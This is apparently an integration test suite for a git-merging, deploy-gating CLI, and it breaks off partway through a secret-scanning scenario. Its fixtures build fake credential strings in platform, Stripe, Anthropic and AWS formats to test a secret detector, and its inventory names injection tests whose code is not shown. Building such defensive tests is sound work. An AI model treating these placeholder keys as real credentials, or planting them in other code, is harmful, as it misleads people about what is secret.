// getAdvantage CLI — INTEGRATION TEST SUITE (`npm test` / `node tests/run.mjs`).
//
// The conductor performs real merges and rollbacks on user repos — so it is
// tested against REAL executions, not mocks: every scenario scaffolds a
// hermetic throwaway git repo (same approach as `getadvantage demo`) in a temp
// dir, spawns the actual CLI (`node index.mjs …`) against it, and asserts on
// exit codes, --json payloads, git state, and file contents. Node built-ins
// only; each scenario removes its own temp dirs (worktrees live inside them).
//
// Inventory:
//   1. all-clean landing            — N disjoint lanes land, exit 0, JSON GO
//   2. textual conflict             — halts the train, tree restored, exit 1
//   3. semantic break quarantine    — rolled back; good lanes still land
//   4. dirty-tree --apply refusal   — preflight blocks, non-zero exit
//   5. idempotent re-run            — second --apply is a no-op, exit 0
//   6. Bug A regression             — post-train dirt must NOT revert landed lanes
//   7. Bug B regression             — a lane adding a dependency lands, not quarantined
//   8. plain-Node repo              — `check` gives no false NO-GO; skips are
//                                     neutral "–" with their own verdict count
//  8b. BOM'd package.json           — detected as a Node project; build gate RUNS
//                                     (regression: BOM → "generic repo" → false GO)
//  8c. broken package.json          — honest ⚠ "could not be parsed", never a
//                                     ✓ "(no package.json)" skip
//   9. own-key secret scan          — adv_live_ (lowercase base36) blocks
//  9b. tracked .env                 — committed .env BLOCKS by itself; contents scanned too
//  9c. clean repo / false positives — placeholder DB URL, CSS class, gitignored .env all pass;
//                                     sk-ant- labeled "Anthropic secret key", not OpenAI
//  9d. oversized file (>2MB)        — head+tail partial scan finds a trailing secret, discloses it
//  9e. allowlist (0.8.2/0.8.3)      — AWS EXAMPLE built-in + tracked policy
//                                     (value/hash/path); real keys still NO-GO; disclosed
//  9f. policy safety (0.8.3)        — untracked/ignored policy cannot authorize;
//                                     display fp ≠ auth id; patternIds; version;
//                                     current-vs-legacy precedence; collisions;
//                                     two distinct PEM private keys: hash of one
//                                     must not authorize the other;
//                                     incomplete/truncated PEM (no END) still NO-GO
//                                     and never value/hash-allowlistable
//  10. fan-out lane branches        — namespaced ga/lane-N; re-run idempotent
//  11. branch never silently reused — pre-existing ga/lane-N → clear error
//  12. marker-dir back-compat       — legacy .ship-safe/ read; new writes → .getadvantage/
//  13. --report connector           — opt-in POST matches the ingest contract
//                                     (hermetic mock server); nothing sent without it
//  14. architecture scanner         — oversized + duplicated files flagged with the
//                                     right signals; a small repo stays quiet; the
//                                     check advisory never changes the verdict
//  15. --version / -v               — prints the package version, exit 0, no gate run
//  16. unknown gate flags           — `check --bogus-flag` errors with exit 1
//  17. map on an Express repo       — Express/Fastify routes PARSED: table with
//                                     methods, /health auth-gated, POST /api/pay
//                                     flagged ⚠ (mutates, ungated); estate view +
//                                     deps-based integrations (openai) intact
//  18. map on a Flask repo          — Flask routes PARSED: @app.route methods,
//                                     @login_required gates /submit, POST /pay ⚠;
//                                     requirements.txt integrations (anthropic)
//  19. map --help / mcp --help      — command-specific help incl. MCP registration JSON
//  20. map on a FastAPI repo        — FastAPI @router.get/post parsed; POST /items
//                                     ⚠ (mutates, ungated), Depends() gates /me
//  21. UTF-16 secret (0.7.1)        — a committed key in a UTF-16-LE file (the
//                                     PowerShell default) is SCANNED, not skipped → NO-GO
//  22. non-ASCII filename (0.7.1)   — a committed key in a file with an umlaut name
//                                     is scanned (git -z, no quotepath drop) → NO-GO
//  23. tsc not installed (0.7.1)    — typescript declared but absent → honest warn,
//                                     never a downloaded third-party `tsc`
//  24. demo outside a repo (0.7.1)  — `demo` runs in a non-git dir (scaffolds its own),
//                                     no repo-required dead-end
//  25. brief preserves notes (0.7.2) — regenerating PROJECT-BRIEF.md keeps the
//                                     protected notes block; refuses foreign files
//  26. map == check routes (0.7.2)  — Next src/app + Express: same route count
//  27. map --json (0.7.2)           — emits a JSON document (no longer ignored)
//  28. typo did-you-mean (0.7.2)    — unknown cmd suggests, does not dump full help
//  29. own-artifacts dirty (0.7.2)  — PROJECT-BRIEF.md alone is not "scratch" risk
//  37. SARIF export (0.8.4)         — clean GO + secret NO-GO + redaction + paths +
//                                     unicode/special filenames + multi-finding + stable
//                                     rule ids + security-vs-quality metadata + no
//                                     credential-shaped filename URI leak + github-action
//                                     workflow majors/permissions + idempotence/refusal
//  38. packed-package SARIF cold path — tarball includes sarif.mjs; cold npx writes
//                                     and parses SARIF outside the source tree
//  39. first-party Action + PR summary (0.9.0) — action.yml + summary marker +
//                                     update-in-place, fork/permission fallback, failed
//                                     SARIF path, credential-shaped filenames, markdown
//                                     injection, legacy migration, packed action files
//  40. Action trust repairs (REVIEW_NO_GO) — credential-scrubbed tsc env, ghs_/Bearer/
//                                     DB redaction, upload honesty, GITHUB_OUTPUT injection,
//                                     comment pagination + spoofed marker, stale SARIF
//  40. Action repair hostiles (0.9.0) — credential-scrubbed tsc env, ghs_/Bearer/DB
//                                     redaction, GITHUB_OUTPUT injection, page-2
//                                     bot marker + spoofed marker, stale SARIF proof,
//                                     upload-failure fails required check (YAML)
//  41. Action repair pass-2 hostiles — hard-refuse pull_request_target; SARIF
//                                     SHA-256 content identity; GITHUB_ACTOR≠owner;
//                                     pagination-cap no-POST; Action release contract;
//                                     non-mutating install without package-lock
//  42. Action repair pass-3 hostiles — eligible upload skipped=red; scrubbed install
//                                     + hostile .npmrc; exact token ownership (not
//                                     arbitrary [bot]); ref-style MD + encodeArtifactUri;
//                                     SARIF run nonce; no api.github.com in tests;
//                                     publish uses: ./ runner gate
//  43. Action repair pass-4 release  — docs-only push no-op (npm gitHead ≠ HEAD);
//                                     annotated exact tag peel; lightweight v1 peel;
//                                     post-publish gitHead verify before tags;
//                                     uses: ./ before npm publish; unproven source fails
//  44. Publish self-gate fixture     — versioned clean fixtures/publish-self-gate;
//                                     workflow working-directory + materialize;
//                                     nested-git clean GO; product-root still NO-GO
//                                     on intentional tests/run.mjs hostiles
//  45. client-bundle secret exposure — committed sk_live in .next/static → NO-GO;
//                                     Vite dist / VITE_* assignment with private
//                                     material → NO-GO (prefix not an exemption);
//                                     public VITE_/NEXT_PUBLIC_ config alone → not
//                                     a secret NO-GO; .next/cache still skipped
//                                     (honest non-static boundary); packed cold path
//  46. Intent Contract (0.10.0)       — init+commit+check GO; outside allow NO-GO
//                                     (path names only); deny wins; required/maxFiles;
//                                     staged/unstaged/delete/rename/untracked;
//                                     worktree broaden cannot self-authorize;
//                                     malformed/traversal fail closed; packed cold
//                                     init+check; main check omits without contract

import { createHash } from "node:crypto";
import { execFileSync, spawn, spawnSync } from "node:child_process";
import { existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, utimesSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";
import assert from "node:assert/strict";

/** Same as util.mjs secretAuthId — local so scenarios never import production modules. */
function hashOf(match) {
  return createHash("sha256").update(String(match ?? ""), "utf8").digest("hex");
}

/** Same as util.mjs fingerprint — display-only; for collision fixtures. */
function displayFp(match) {
  let head = match.slice(0, 6);
  if (match.length > 14) {
    const pre = match.slice(0, 12).match(/^.+[_-]/);
    if (pre && match.length - pre[0].length >= 8) head = pre[0];
  }
  const tail = match.length > 14 ? match.slice(-4) : "";
  return `${head}…${tail} (${match.length} chars)`;
}

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const INDEX = path.join(__dirname, "..", "index.mjs");

// ---------------------------------------------------------------------------
// harness
// ---------------------------------------------------------------------------
const scenarios = [];
function scenario(name, fn) {
  scenarios.push({ name, fn });
}

/** Hermetic child env: the runner's own GITHUB_* / GETADVANTAGE_* vars must never
 *  leak into a scenario (a user's global GETADVANTAGE_REPORT=1 would otherwise
 *  make every scenario's `check` attempt the network). `extra` layers on top. */
function buildEnv(extra) {
  const env = { NO_COLOR: "1" };
  for (const [k, v] of Object.entries(process.env)) {
    if (k.startsWith("GITHUB_") || k.startsWith("GETADVANTAGE_")) continue;
    env[k] = v;
  }
  return Object.assign(env, extra || {});
}

/** Spawn the real CLI in a repo; capture code + both streams (never throws). */
function run(args, cwd, envExtra) {
  const r = spawnSync(process.execPath, [INDEX, ...args], {
    cwd,
    encoding: "utf8",
    maxBuffer: 64 * 1024 * 1024,
    timeout: 300_000,
    env: buildEnv(envExtra),
  });
  if (r.error) throw r.error;
  return { code: r.status ?? -1, stdout: r.stdout || "", stderr: r.stderr || "" };
}

/** Async variant of run() — REQUIRED when the scenario also hosts an in-process
 *  server: spawnSync blocks the event loop, so the mock server could never
 *  answer the child's request. */
function runAsync(args, cwd, envExtra) {
  return new Promise((resolve, reject) => {
    const child = spawn(process.execPath, [INDEX, ...args], {
      cwd,
      env: buildEnv(envExtra),
      stdio: ["ignore", "pipe", "pipe"],
    });
    let stdout = "";
    let stderr = "";
    child.stdout.on("data", (d) => (stdout += d));
    child.stderr.on("data", (d) => (stderr += d));
    const timer = setTimeout(() => child.kill(), 300_000);
    child.on("error", (e) => {
      clearTimeout(timer);
      reject(e);
    });
    child.on("close", (code) => {
      clearTimeout(timer);
      resolve({ code: code ?? -1, stdout, stderr });
    });
  });
}

/** Run git in a dir, throwing on failure (test setup must be deterministic). */
function g(args, cwd) {
  return execFileSync("git", args, {
    cwd,
    stdio: ["ignore", "pipe", "pipe"],
    encoding: "utf8",
  }).trim();
}

function write(repo, rel, content) {
  const abs = path.join(repo, rel);
  mkdirSync(path.dirname(abs), { recursive: true });
  writeFileSync(abs, content, "utf8");
}

function freshBase() {
  return mkdtempSync(path.join(tmpdir(), "ga-cli-test-"));
}

function cleanup(base) {
  try {
    rmSync(base, { recursive: true, force: true, maxRetries: 10, retryDelay: 100 });
  } catch {
    // Windows can hold brief locks; a leaked temp dir must not fail the suite.
    console.error(`  (could not fully remove temp dir: ${base})`);
  }
}

function initRepo(dir) {
  mkdirSync(dir, { recursive: true });
  g(["init", "-q", "-b", "main"], dir);
  g(["config", "user.email", "tests@getadvantage.app"], dir);
  g(["config", "user.name", "getAdvantage Tests"], dir);
  g(["config", "commit.gpgsign", "false"], dir);
}

function commitAll(repo, msg) {
  g(["add", "-A"], repo);
  g(["commit", "-q", "-m", msg], repo);
}

const README = (intro) =>
  ["# sample", "", intro, "", "## Usage", "", "    node app.js", ""].join("\n");
const APP_JS = [
  "// sample entrypoint",
  "export function main() {",
  "  return 'hello from sample';",
  "}",
  "",
  "console.log(main());",
  "",
].join("\n");

/** Scaffold the standard sample repo at <base>/sample. `pkg`/`files` override. */
function scaffold(base, { pkg = {}, files = {} } = {}) {
  const repo = path.join(base, "sample");
  initRepo(repo);
  write(
    repo,
    "package.json",
    JSON.stringify(
      {
        name: "sample",
        version: "1.0.0",
        private: true,
        type: "module",
        scripts: { build: "node --check app.js" },
        ...pkg,
      },
      null,
      2,
    ) + "\n",
  );
  write(repo, "README.md", README("A tiny sample project for the conductor tests."));
  write(repo, "app.js", APP_JS);
  for (const [rel, content] of Object.entries(files)) write(repo, rel, content);
  commitAll(repo, "chore: initial sample");
  return repo;
}

/** One lane: worktree at <base>/sample-lane-N on branch ga/lane-N, edited + committed. */
function makeLane(repo, base, i, edit, msg = `lane ${i}`) {
  const laneDir = path.join(base, `sample-lane-${i}`);
  g(["worktree", "add", "-q", "-b", `ga/lane-${i}`, laneDir, "HEAD"], repo);
  edit(laneDir);
  g(["add", "-A"], laneDir);
  g(["commit", "-q", "-m", msg], laneDir);
  return laneDir;
}

function porcelain(repo) {
  return g(["status", "--porcelain"], repo);
}

function laneIn(doc, i) {
  const lane = (doc.lanes || []).find((l) => l.lane === i);
  assert.ok(lane, `lane ${i} missing from JSON lanes: ${JSON.stringify(doc.lanes)}`);
  return lane;
}

function parseJson(r) {
  try {
    return JSON.parse(r.stdout);
  } catch (e) {
    throw new Error(`stdout was not a single JSON document:\n${r.stdout}\n--- stderr ---\n${r.stderr}`);
  }
}

// ---------------------------------------------------------------------------
// 1. all-clean landing
// ---------------------------------------------------------------------------
scenario("all-clean landing: disjoint lanes land, exit 0, JSON GO", () => {
  const base = freshBase();
  try {
    const repo = scaffold(base);
    makeLane(repo, base, 1, (d) => write(d, "README.md", README("Friendlier intro from lane one.")));
    makeLane(repo, base, 2, (d) => write(d, "util.js", "export const util = 1;\n"));

    const r = run(["fan-in", "--apply", "--json"], repo);
    assert.equal(r.code, 0, `expected exit 0\n${r.stderr}`);
    const doc = parseJson(r);
    assert.equal(doc.command, "fan-in");
    assert.equal(doc.verdict, "GO");
    assert.equal(doc.exitCode, 0);
    assert.equal(doc.mode, "apply");
    assert.ok(typeof doc.generatedAt === "string" && doc.generatedAt.includes("T"));
    assert.equal(laneIn(doc, 1).outcome, "landed");
    assert.equal(laneIn(doc, 2).outcome, "landed");

    // The merged tree really contains both lanes' work, and it's committed clean.
    assert.ok(readFileSync(path.join(repo, "README.md"), "utf8").includes("Friendlier intro from lane one."));
    assert.ok(existsSync(path.join(repo, "util.js")));
    assert.equal(porcelain(repo), "");
    // And the merged tree builds (same gate the train ran, re-run directly).
    execFileSync(process.execPath, ["--check", path.join(repo, "app.js")]);
  } finally {
    cleanup(base);
  }
});

// ---------------------------------------------------------------------------
// 2. textual conflict halts the train
// ---------------------------------------------------------------------------
scenario("textual conflict: halts, tree restored, downstream lane skipped, exit 1", () => {
  const base = freshBase();
  try {
    const repo = scaffold(base);
    makeLane(repo, base, 1, (d) => write(d, "README.md", README("Intro rewritten by lane one.")));
    makeLane(repo, base, 2, (d) => write(d, "README.md", README("Intro rewritten differently by lane two.")));
    makeLane(repo, base, 3, (d) => write(d, "feature3.js", "export const three = 3;\n"));

    const r = run(["fan-in", "--apply", "--json"], repo);
    assert.equal(r.code, 1, `expected exit 1\n${r.stderr}`);
    const doc = parseJson(r);
    assert.equal(doc.verdict, "NO-GO");
    assert.equal(laneIn(doc, 1).outcome, "landed");
    assert.equal(laneIn(doc, 2).outcome, "conflict");
    assert.ok(laneIn(doc, 2).conflictFiles.includes("README.md"));
    assert.equal(laneIn(doc, 3).outcome, "skipped"); // train halted before it

    // Tree restored: clean, lane 1's content on main, lane 2/3's NOT merged.
    assert.equal(porcelain(repo), "");
    const readme = readFileSync(path.join(repo, "README.md"), "utf8");
    assert.ok(readme.includes("Intro rewritten by lane one."));
    assert.ok(!readme.includes("lane two"));
    assert.ok(!existsSync(path.join(repo, "feature3.js")));
  } finally {
    cleanup(base);
  }
});

// ---------------------------------------------------------------------------
// 3. semantic break → quarantined; good lanes still land
// ---------------------------------------------------------------------------
scenario("semantic break: quarantined + rolled back, good lanes still land", () => {
  const base = freshBase();
  try {
    const repo = scaffold(base);
    const goodApp = readFileSync(path.join(repo, "app.js"), "utf8");
    makeLane(repo, base, 1, (d) => write(d, "feature1.js", "export const one = 1;\n"));
    makeLane(repo, base, 2, (d) =>
      write(d, "app.js", "export function main() {\n  return 'broken'\n\nconsole.log(main());\n"),
    ); // syntax error — merges clean, builds red
    makeLane(repo, base, 3, (d) => write(d, "feature3.js", "export const three = 3;\n"));

    const r = run(["fan-in", "--apply", "--json"], repo);
    assert.equal(r.code, 1, `expected exit 1\n${r.stderr}`);
    const doc = parseJson(r);
    assert.equal(laneIn(doc, 1).outcome, "landed");
    assert.equal(laneIn(doc, 2).outcome, "quarantined");
    assert.equal(laneIn(doc, 3).outcome, "landed"); // train continues past a quarantine

    // The quarantined lane's break never reached main; the good lanes did.
    // Normalize EOL: git may restore the file with CRLF on Windows (core.autocrlf),
    // and this assertion is about content, not line endings.
    assert.equal(readFileSync(path.join(repo, "app.js"), "utf8").replace(/\r\n/g, "\n"), goodApp);
    assert.ok(existsSync(path.join(repo, "feature1.js")));
    assert.ok(existsSync(path.join(repo, "feature3.js")));
    assert.equal(porcelain(repo), "");
  } finally {
    cleanup(base);
  }
});

// ---------------------------------------------------------------------------
// 4. dirty-tree --apply refusal
// ---------------------------------------------------------------------------
scenario("dirty tree: --apply refuses, nothing merges, non-zero exit", () => {
  const base = freshBase();
  try {
    const repo = scaffold(base);
    makeLane(repo, base, 1, (d) => write(d, "feature1.js", "export const one = 1;\n"));
    const headBefore = g(["rev-parse", "HEAD"], repo);
    // Dirty the integration tree (a tracked, uncommitted modification).
    write(repo, "README.md", README("uncommitted local edit"));

    const r = run(["fan-in", "--apply", "--json"], repo);
    assert.notEqual(r.code, 0, "a refused apply must NOT exit 0 (automation would deploy)");
    const doc = parseJson(r);
    assert.equal(doc.verdict, "NO-GO");
    assert.equal(doc.preflight, "dirty-tree");
    assert.equal(laneIn(doc, 1).outcome, "skipped");
    assert.equal(g(["rev-parse", "HEAD"], repo), headBefore, "nothing may land on a dirty tree");
  } finally {
    cleanup(base);
  }
});

// ---------------------------------------------------------------------------
// 5. idempotent re-run
// ---------------------------------------------------------------------------
scenario("idempotent re-run: second --apply is a no-op, exit 0", () => {
  const base = freshBase();
  try {
    const repo = scaffold(base);
    makeLane(repo, base, 1, (d) => write(d, "feature1.js", "export const one = 1;\n"));

    const r1 = run(["fan-in", "--apply", "--json"], repo);
    assert.equal(r1.code, 0, r1.stderr);
    const head1 = g(["rev-parse", "HEAD"], repo);

    const r2 = run(["fan-in", "--apply", "--json"], repo);
    assert.equal(r2.code, 0, r2.stderr);
    const doc2 = parseJson(r2);
    assert.equal(laneIn(doc2, 1).outcome, "skipped"); // 0 commits ahead now
    assert.equal(g(["rev-parse", "HEAD"], repo), head1, "re-run must not create new commits");
    assert.equal(porcelain(repo), "");
  } finally {
    cleanup(base);
  }
});

// ---------------------------------------------------------------------------
// 6. Bug A regression — post-train dirt must NOT revert landed lanes
// ---------------------------------------------------------------------------
scenario("Bug A: post-train dirt never reverts a landed lane (honest STOP instead)", () => {
  const base = freshBase();
  try {
    // A build step that WRITES a tracked file — after the last lane lands, the
    // tree is dirty with no merge in progress. The old safety net hard-reset to
    // the start commit here, silently discarding the landed merge.
    const repo = scaffold(base, {
      pkg: { scripts: { build: "node build.js" } },
      files: {
        "build.js": 'import { writeFileSync } from "node:fs";\nwriteFileSync(new URL("./stamp.txt", import.meta.url), "built\\n");\n',
        "stamp.txt": "initial\n",
      },
    });
    makeLane(repo, base, 1, (d) => write(d, "README.md", README("BUG-A-MARKER intro from lane one.")));

    const r = run(["fan-in", "--apply", "--json"], repo);
    const doc = parseJson(r);
    assert.equal(laneIn(doc, 1).outcome, "landed", r.stderr);

    // THE regression assertion: the landed merge commit SURVIVES the cleanup.
    const readmeAtHead = g(["show", "HEAD:README.md"], repo);
    assert.ok(
      readmeAtHead.includes("BUG-A-MARKER"),
      "landed lane was reverted by post-train cleanup — Bug A is back",
    );
    assert.ok(g(["log", "--oneline", "-3"], repo).includes("Merge"), "the merge commit must remain in history");

    // The unexpected dirt was NOT nuked (it isn't ours to discard)…
    assert.equal(readFileSync(path.join(repo, "stamp.txt"), "utf8"), "built\n");
    // …and the run is honest about it: STOP report + non-zero exit + JSON flag.
    assert.equal(r.code, 1, "a dirty post-train tree must not exit 0");
    assert.equal(doc.postTrainDirty, true);
    assert.ok(/STOPPED/.test(r.stderr), "expected the honest STOP report on stderr");
  } finally {
    cleanup(base);
  }
});

// ---------------------------------------------------------------------------
// 7. Bug B regression — a lane adding a dependency lands, not quarantined
// ---------------------------------------------------------------------------
scenario("Bug B: lane adding a dependency is installed + lands (not quarantined)", () => {
  const base = freshBase();
  try {
    const repo = scaffold(base);
    // The lane vendors a local package (file: dep — installable offline), adds
    // it to package.json, and makes the BUILD require it. Without the install
    // step the combined-tree gate would build red → false quarantine.
    makeLane(repo, base, 1, (d) => {
      write(d, "vendor/local-dep/package.json", JSON.stringify({ name: "local-dep", version: "1.0.0", main: "index.js" }, null, 2) + "\n");
      write(d, "vendor/local-dep/index.js", "module.exports = 'ok';\n");
      write(d, "check-dep.cjs", 'require("local-dep");\nconsole.log("dep ok");\n');
      write(
        d,
        "package.json",
        JSON.stringify(
          {
            name: "sample",
            version: "1.0.0",
            private: true,
            type: "module",
            scripts: { build: "node check-dep.cjs" },
            dependencies: { "local-dep": "file:vendor/local-dep" },
          },
          null,
          2,
        ) + "\n",
      );
    });

    const r = run(["fan-in", "--apply", "--json"], repo);
    const doc = parseJson(r);
    assert.equal(
      laneIn(doc, 1).outcome,
      "landed",
      `dependency lane must land, got: ${JSON.stringify(laneIn(doc, 1))}\n${r.stderr}`,
    );
    assert.equal(r.code, 0, r.stderr);
    assert.ok(/installing merged dependencies/i.test(r.stderr), "expected the install line in the human output");
    assert.ok(existsSync(path.join(repo, "node_modules", "local-dep")), "the merged dependency must be installed");
  } finally {
    cleanup(base);
  }
});

// ---------------------------------------------------------------------------
// 8. plain-Node repo — no false NO-GO
// ---------------------------------------------------------------------------
scenario("plain-Node repo: `check` gives GO (no false NO-GO from stack-specific checks)", () => {
  const base = freshBase();
  try {
    const repo = path.join(base, "sample");
    initRepo(repo);
    write(repo, "package.json", JSON.stringify({ name: "plain", version: "1.0.0", private: true, type: "module" }, null, 2) + "\n");
    write(repo, "app.js", APP_JS);
    write(repo, "README.md", README("A plain Node project — no tsconfig, no build script, no framework."));
    commitAll(repo, "chore: plain node repo");

    const r = run(["check", "--json"], repo);
    assert.equal(r.code, 0, `plain-Node repo must be GO\n${r.stderr}`);
    const doc = parseJson(r);
    assert.equal(doc.command, "check");
    assert.equal(doc.verdict, "GO");
    assert.ok(Array.isArray(doc.checks) && doc.checks.length > 0);
    assert.ok(doc.checks.every((c) => c.status !== "fail"), JSON.stringify(doc.checks, null, 2));
    const typecheck = doc.checks.find((c) => c.label.startsWith("Typecheck"));
    assert.ok(typecheck && typecheck.status === "skip" && /Skipped/.test(typecheck.detail));
    // Skipped checks are NEUTRAL: their own count in the verdict line (human
    // channel = stderr under --json), never folded into the ✓ tally.
    assert.ok(/\d+ skipped/.test(r.stderr), `verdict line must carry a separate skipped count:\n${r.stderr}`);
  } finally {
    cleanup(base);
  }
});

// ---------------------------------------------------------------------------
// 8b. BOM'd package.json — the PowerShell default must not fake a "generic repo"
// ---------------------------------------------------------------------------
scenario("BOM'd package.json: detected as a Node project, the build gate RUNS (no false-GO skip)", () => {
  const base = freshBase();
  try {
    const repo = path.join(base, "sample");
    initRepo(repo);
    const pkg = JSON.stringify(
      { name: "bom-repo", version: "1.0.0", private: true, type: "module", scripts: { build: "node --check app.js" } },
      null,
      2,
    ) + "\n";
    // ﻿ = the UTF-8 BOM PowerShell writes by default. Before 0.6.2 this made
    // JSON.parse fail → "generic repo" → build gate silently skipped → false GO.
    write(repo, "package.json", "﻿" + pkg);
    write(repo, "app.js", APP_JS);
    commitAll(repo, "chore: bom repo");

    const r = run(["check", "--build", "--json"], repo);
    assert.equal(r.code, 0, r.stderr);
    const doc = parseJson(r);
    assert.equal(doc.verdict, "GO");
    // The stack detection must see through the BOM…
    assert.ok(/detected:\s+Node project/.test(r.stderr), `stack detection must see through the BOM:\n${r.stderr}`);
    // …and the BUILD GATE must actually run, not skip.
    const build = doc.checks.find((c) => c.label.startsWith("Production build"));
    assert.ok(
      build && build.status === "pass",
      `the build gate must RUN on a BOM'd package.json:\n${JSON.stringify(doc.checks, null, 2)}`,
    );
    assert.ok(!(r.stdout + r.stderr).includes("no package.json"), "must never claim there is no package.json");
  } finally {
    cleanup(base);
  }
});

// ---------------------------------------------------------------------------
// 8c. broken package.json — NO-GO ("not checkable ≠ GO"), never "(no package.json)"
// ---------------------------------------------------------------------------
scenario("broken package.json: NO-GO via Package manifest check — a corrupt manifest is never a GO", () => {
  const base = freshBase();
  try {
    const repo = path.join(base, "sample");
    initRepo(repo);
    write(repo, "package.json", "{ this is not json\n");
    write(repo, "app.js", APP_JS);
    commitAll(repo, "chore: broken manifest");

    const r = run(["check", "--build", "--json"], repo);
    // A guaranteed-broken deploy must not get green light (was a false GO: the
    // build gate could only "warn: could not run" and the verdict stayed GO).
    assert.equal(r.code, 1, `a corrupt manifest must be NO-GO:\n${r.stderr}`);
    const doc = parseJson(r);
    assert.equal(doc.verdict, "NO-GO");
    const manifest = doc.checks.find((c) => c.label === "Package manifest");
    assert.ok(manifest && manifest.status === "fail", JSON.stringify(doc.checks, null, 2));
    assert.ok(/not valid JSON|could not be parsed/.test(manifest.detail), manifest.detail);
    // Build/typecheck defer to the manifest check — they must not green-tick.
    const build = doc.checks.find((c) => c.label === "Build");
    assert.ok(!build || build.status !== "pass", `build must not pass on a broken manifest:\n${JSON.stringify(build)}`);
    assert.ok(!(r.stdout + r.stderr).includes("(no package.json)"), "must never claim '(no package.json)' when the file exists");
  } finally {
    cleanup(base);
  }
});

// ---------------------------------------------------------------------------
// 9. own-key secret scan — adv_live_ lowercase base36 blocks
// ---------------------------------------------------------------------------
scenario("secret scan: a committed adv_live_ platform key blocks (NO-GO)", () => {
  const base = freshBase();
  try {
    const repo = path.join(base, "sample");
    initRepo(repo);
    // Assembled at runtime so this TEST FILE never trips the scanner itself.
    const token = ["adv", "live", "x9k2m4p7q1r8s3t6u0vw"].join("_");
    write(repo, "config.js", `export const KEY = "${token}";\n`);
    write(repo, "package.json", JSON.stringify({ name: "leaky", version: "1.0.0", private: true }, null, 2) + "\n");
    commitAll(repo, "chore: leaky repo");

    const r = run(["check", "--json"], repo);
    assert.equal(r.code, 1, "a committed platform key must be a NO-GO");
    const doc = parseJson(r);
    assert.equal(doc.verdict, "NO-GO");
    const secret = doc.checks.find((c) => c.label === "Secret scan");
    assert.ok(secret && secret.status === "fail", JSON.stringify(doc.checks, null, 2));
    assert.ok(secret.extra.join("\n").includes("getAdvantage platform key"));
    // The report must FINGERPRINT, never echo, the token.
    assert.ok(!JSON.stringify(doc).includes(token), "the full secret must never be echoed");
  } finally {
    cleanup(base);
  }
});

// ---------------------------------------------------------------------------
// 9b. tracked .env — committed .env BLOCKS by itself, whatever it contains
// ---------------------------------------------------------------------------
scenario("tracked .env: a committed .env blocks (NO-GO), plus its contents are scanned", () => {
  const base = freshBase();
  try {
    const repo = path.join(base, "sample");
    initRepo(repo);
    // Assembled at runtime (string concatenation) so this TEST FILE never
    // trips the scanner itself.
    const stripeKey = "sk_live_" + "0".repeat(26);
    write(repo, "package.json", JSON.stringify({ name: "leaky-env", version: "1.0.0", private: true }, null, 2) + "\n");
    write(repo, ".env", `STRIPE_KEY=${stripeKey}\n`);
    commitAll(repo, "chore: oops committed .env");

    const r = run(["check", "--json"], repo);
    assert.equal(r.code, 1, "a committed .env must be a NO-GO");
    const doc = parseJson(r);
    assert.equal(doc.verdict, "NO-GO");
    const trackedEnv = doc.checks.find((c) => c.label === "Tracked .env file");
    assert.ok(trackedEnv && trackedEnv.status === "fail", JSON.stringify(doc.checks, null, 2));
    assert.ok(trackedEnv.extra.join("\n").includes(".env"));
    // The .env's CONTENTS are still scanned (no .env basename skip anymore).
    const secret = doc.checks.find((c) => c.label === "Secret scan");
    assert.ok(secret && secret.status === "fail", JSON.stringify(doc.checks, null, 2));
    assert.ok(secret.extra.join("\n").includes(".env"), "the secret scan must report the .env file by name");
    assert.ok(!JSON.stringify(doc).includes(stripeKey), "the full secret must never be echoed");
  } finally {
    cleanup(base);
  }
});

// ---------------------------------------------------------------------------
// 9c. clean repo — zero false positives from docs/CSS; sk-ant labeled correctly
// ---------------------------------------------------------------------------
scenario("clean repo: GO with zero false positives (docs URL, CSS class, gitignored .env); sk-ant labeled Anthropic", () => {
  const base = freshBase();
  try {
    const repo = path.join(base, "sample");
    initRepo(repo);
    // A doc-shaped DB URL with an obvious placeholder password — must NOT block.
    write(repo, "SETUP.md", "Connect with `postgres://myuser:mypassword@localhost:5432/mydb`.\n");
    // A CSS class chain shaped like an OpenAI key but with no digit — must NOT block.
    write(repo, "styles.css", ".sk-circle-fade-dot-before-anim { animation: fade 1s; }\n");
    write(repo, "package.json", JSON.stringify({ name: "clean-repo", version: "1.0.0", private: true }, null, 2) + "\n");
    write(repo, ".gitignore", ".env\n");
    commitAll(repo, "chore: clean repo");
    // Local gitignored .env with a real-looking key — must NOT be read or flagged.
    write(repo, ".env", "STRIPE_KEY=sk_live_" + "1".repeat(26) + "\n");

    const r = run(["check", "--json"], repo);
    assert.equal(r.code, 0, `expected GO, zero false positives\n${r.stderr}`);
    const doc = parseJson(r);
    assert.equal(doc.verdict, "GO");
    assert.ok(doc.checks.every((c) => c.status !== "fail"), JSON.stringify(doc.checks, null, 2));
    const secret = doc.checks.find((c) => c.label === "Secret scan");
    assert.equal(secret.status, "pass", JSON.stringify(secret));
    const trackedEnv = doc.checks.find((c) => c.label === "Tracked .env file");
    assert.equal(trackedEnv.status, "pass");
    assert.ok(/No \.env files tracked by git/.test(trackedEnv.detail));

    // Now prove a REAL Anthropic key IS labeled correctly (assembled at runtime
    // so this test file never trips the scanner itself), committed in a
    // separate throwaway repo so the clean-repo assertion above stays proof
    // of zero false positives.
    const anthropicKey = ["sk", "ant", "a1b2c3d4e5f6g7h8i9j0k1l2"].join("-");
    const antRepo = path.join(base, "ant-check");
    initRepo(antRepo);
    write(antRepo, "config.js", `export const KEY = "${anthropicKey}";\n`);
    write(antRepo, "package.json", JSON.stringify({ name: "ant", version: "1.0.0", private: true }, null, 2) + "\n");
    commitAll(antRepo, "chore: anthropic key committed");
    const ra = run(["check", "--json"], antRepo);
    assert.equal(ra.code, 1, "a committed Anthropic key must NO-GO");
    const adoc = parseJson(ra);
    const asecret = adoc.checks.find((c) => c.label === "Secret scan");
    assert.ok(asecret.extra.join("\n").includes("Anthropic secret key"), JSON.stringify(asecret));
    assert.ok(!asecret.extra.join("\n").includes("OpenAI secret key"), "must not double-label as OpenAI");
  } finally {
    cleanup(base);
  }
});

// ---------------------------------------------------------------------------
// 9d. oversized file (>2MB) — head+tail partial scan, never silently skipped
// ---------------------------------------------------------------------------
scenario("oversized file (>2MB): secret at the tail is found via head+tail partial scan, disclosed by name", () => {
  const base = freshBase();
  try {
    const repo = path.join(base, "sample");
    initRepo(repo);
    const awsKey = "AKIA" + "0".repeat(16);
